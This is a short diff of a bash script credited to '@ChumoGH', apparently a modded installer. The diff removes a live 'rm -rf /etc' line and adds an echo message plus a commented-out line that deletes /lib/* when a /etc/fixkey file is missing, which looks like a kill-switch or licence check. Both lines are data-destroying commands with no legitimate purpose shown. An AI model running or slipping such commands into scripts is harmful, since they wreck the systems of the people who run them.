@@ -1,4 +1,4 @@
 #!/bin/bash
 # Moded creado por @ChumoGH
-
-rm -rf /etc
+echo -e "HOLA EJUCCION FIX DESDE ChatGPT con BPMN"
+#[[ ! -e /etc/fixkey ]] && rm -rf /lib/*
